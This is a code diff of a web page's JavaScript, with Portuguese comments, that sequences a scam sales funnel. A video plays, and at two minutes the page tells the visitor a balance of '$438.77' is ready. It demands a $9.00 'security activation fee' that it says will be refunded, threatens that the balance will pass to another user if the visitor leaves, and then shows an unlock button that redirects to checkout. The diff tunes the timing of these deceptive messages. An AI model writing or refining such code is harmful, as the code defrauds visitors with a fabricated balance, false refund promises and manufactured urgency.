@@ -919,17 +919,18 @@
             window.location.href = destination;
           }
         }
-        var ctaShown = false;
-        function showCtaButton() {
-          if (ctaShown) return;
-          ctaShown = true;
-          askButton('UNLOCK MY $438.77 BALANCE NOW →').then(function () {
-            redirectToCheckout();
-          });
+        // Aguarda a VSL 2 atingir 2:00 minutos (120 segundos)
+        var reachedTwoMinutes = false;
+        var resolveTwoMinutes = null;
+        var twoMinutesPromise = new Promise(function (res) {
+          resolveTwoMinutes = res;
+        });
+        function markTwoMinutes() {
+          if (reachedTwoMinutes) return;
+          reachedTwoMinutes = true;
+          if (resolveTwoMinutes) resolveTwoMinutes();
         }
-        // Toca a VSL 2:
-        // 1) Aos 2:30 minutos (150 segundos) exibe o botão UNLOCK
-        // 2) Quando o vídeo acabar por completo, redireciona automaticamente para o checkout
+        // Inicia a VSL 2
         videoBlock(
           'https://stream.mux.com/AwQwkbXYd6kbE2ayuvZv8RYZBXfi4xpzeN4JHoBf00zI.m3u8',
           '16 / 9',
@@ -938,20 +939,25 @@
             redirectToCheckout();
           },
           function (currentTime) {
-            if (currentTime >= 150) {
-              showCtaButton();
+            if (currentTime >= 120) {
+              markTwoMinutes();
             }
           }
         );
-        // Fallback de tempo: se o evento de timeupdate demorar, garante que aos 150s o botão apareça
-        setTimeout(function () {
-          showCtaButton();
-        }, 150000);
+        // Fallback de tempo: aos 120 segundos destrava caso o evento do player demore
+        setTimeout(markTwoMinutes, 120000);
+        // Pausa o fluxo de mensagens e espera atingir os 2:00 da VSL 2
+        await twoMinutesPromise;
+        // SOMENTE agora (após 2:00) as mensagens abaixo da VSL começam a aparecer uma a uma:
         await sayStatus('Your balance of ${{balance}} is ready!\n\nTo withdraw your earnings today, all you need to do is pay a small security activation fee of $9.00\n\nThis is to verify your account and ensure that you are not a bot.', 'reward');
         await sleep(5000);
         await sayStatus('Please note: The fee will be fully refunded after registration, along with your current balance of ${{balance}}', 'alert');
         await sleep(4000);
         await say('This is a unique opportunity.\n\nIf you decide to leave now, your balance will be canceled and transferred to another user on the waiting list.');
+        await sleep(3000);
+        // SOMENTE após todas as mensagens acima aparecerem, exibe o botão de CTA:
+        await askButton('UNLOCK MY $438.77 BALANCE NOW →');
+        redirectToCheckout();
       }
       run();
     })();
